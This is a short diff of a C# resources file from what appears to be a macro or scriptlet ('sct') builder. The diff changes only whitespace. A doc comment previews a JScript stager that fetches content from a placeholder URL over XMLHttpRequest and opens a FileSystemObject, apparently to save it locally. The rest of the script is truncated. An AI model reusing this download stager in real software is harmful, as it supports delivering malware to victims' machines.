@@ -111,8 +111,8 @@ namespace Macro.Properties {
         ///xhr.open(&quot;GET&quot;,&quot;%qwqdanchun%&quot;, false);
         ///xhr.send();
         ///if (xhr.Status == 200) {
-        ///	var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);
-        ///	var stream [字符串的其余部分被截断]&quot;; 的本地化字符串。
+        ///    var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);
+        ///    var  [字符串的其余部分被截断]&quot;; 的本地化字符串。
         /// </summary>
         internal static string sct {
             get {
